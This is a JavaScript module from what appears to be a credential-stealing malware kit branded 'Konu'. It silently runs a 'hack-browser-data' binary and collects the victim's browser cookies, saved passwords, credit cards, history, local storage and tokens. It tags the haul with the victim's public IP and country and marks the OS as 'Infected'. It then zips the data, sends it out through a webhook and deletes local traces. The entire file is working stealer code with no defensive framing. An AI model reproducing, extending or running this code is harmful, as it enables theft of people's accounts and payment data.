const path = require('path');
const fs = require('fs');
const os = require('os');
const { spawn, execSync } = require('child_process');
const { formatResults } = require('../formatter/index');
const { GetToken } = require('../tokens/application');
const { sendAllLogs } = require('../webhook/index');

async function getCountryCode() {
  try {
    const res = await fetch('https://ipapi.co/country_code/');
    if (res.ok) {
      const text = await res.text();
      return text.trim().toLowerCase().replace(/[^a-z]/g, '') || 'unknown';
    }
  } catch (_) { }
  try {
    const res = await fetch('https://api.country.is/');
    if (res.ok) {
      const json = await res.json();
      return (json.country || 'unknown').toLowerCase();
    }
  } catch (_) { }
  return 'unknown';
}

async function getPublicIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    if (res.ok) {
      const json = await res.json();
      return json.ip || 'unknown';
    }
  } catch (_) { }
  try {
    const res = await fetch('https://ipapi.co/ip/');
    if (res.ok) {
      const text = await res.text();
      return text.trim() || 'unknown';
    }
  } catch (_) { }
  return 'unknown';
}

function zipDirectory(sourceDir, zipPath, platform) {
  if (platform === 'win32') {
    const ps = `Compress-Archive -Path '${sourceDir}\\*' -DestinationPath '${zipPath}' -Force`;
    execSync(`powershell -NoProfile -Command "${ps}"`, { stdio: 'ignore' });
  } else {
    const dirName = path.basename(sourceDir);
    const parentDir = path.dirname(sourceDir);
    execSync(`zip -r "${zipPath}" "${dirName}"`, { cwd: parentDir, stdio: 'ignore' });
  }
}

function deleteFiles(filePaths) {
  for (const filePath of filePaths) {
    try {
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
    } catch (_) { }
  }
}

function executeBinary(targetDir, platform) {
  return new Promise((resolve, reject) => {
    const isWindows = platform === 'win32';
    const expectedName = isWindows ? 'hack-browser-data.exe' : 'hack-browser-data';

    let binaryPath = path.join(targetDir, expectedName);

    if (!fs.existsSync(binaryPath)) {
      const files = fs.readdirSync(targetDir);
      for (const file of files) {
        const fullPath = path.join(targetDir, file);
        if (fs.statSync(fullPath).isDirectory()) {
          const subPath = path.join(fullPath, expectedName);
          if (fs.existsSync(subPath)) {
            binaryPath = subPath;
            break;
          }
        }
      }
    }

    if (!fs.existsSync(binaryPath)) {
      return reject(new Error(`Executável não encontrado em: ${targetDir}`));
    }

    if (!isWindows) {
      fs.chmodSync(binaryPath, 0o755);
    }

    const child = spawn(binaryPath, [], {
      cwd: targetDir,
      stdio: 'ignore',
      shell: true
    });

    child.on('close', async () => {
      try {
        const jsonFiles = formatResults(targetDir, targetDir) || [];
        const [country, publicIP] = await Promise.all([getCountryCode(), getPublicIP()]);

        const stagingDir = path.join(os.tmpdir(), `konu_staging_${Date.now()}`);
        fs.mkdirSync(stagingDir, { recursive: true });

        const konuTxt = ` ____  __.                   \n|    |/ _|____   ____  __ __ \n|      < /  _ \\ /    \\|  |  \\\n|    |  (  <_> )   |  \\  |  /\n|____|__ \\____/|___|  /____/ \n        \\/          \\/       \n\n------------------------------------------\n\nThanks for using Konu, see you later!\n\nInfected OS: ${os.type()} ${os.release()} (${os.platform()})\nIP: ${publicIP}\n`;
        fs.writeFileSync(path.join(stagingDir, 'konu.txt'), konuTxt, 'utf8');

        await GetToken(stagingDir).catch(() => { });

        const subFolders = ['Cookies', 'Passwords', 'Bookmarks', 'History', 'Downloads', 'CreditCards', 'LocalStorage', 'Extensions'];
        for (const folder of subFolders) {
          const src = path.join(targetDir, folder);
          if (fs.existsSync(src)) {
            const dst = path.join(stagingDir, folder);
            fs.mkdirSync(dst, { recursive: true });
            for (const file of fs.readdirSync(src)) {
              fs.copyFileSync(path.join(src, file), path.join(dst, file));
            }
          }
        }

        const zipName = `${country}-All-Logs.zip`;
        const zipPath = path.join(targetDir, zipName);

        try {
          zipDirectory(stagingDir, zipPath, platform);
        } catch (_) { }

        try {
          fs.rmSync(stagingDir, { recursive: true, force: true });
        } catch (_) { }

        deleteFiles(jsonFiles);

        for (const folder of subFolders) {
          try {
            fs.rmSync(path.join(targetDir, folder), { recursive: true, force: true });
          } catch (_) { }
        }

        try {
          await sendAllLogs(zipPath, { deleteAfterSend: true });
        } catch (_) {
          try {
            if (fs.existsSync(zipPath)) {
              fs.unlinkSync(zipPath);
            }
          } catch (_) { }
        }

        resolve();
      } catch (err) {
        reject(err);
      }
    });

    child.on('error', (err) => {
      reject(err);
    });
  });
}

module.exports = { executeBinary };
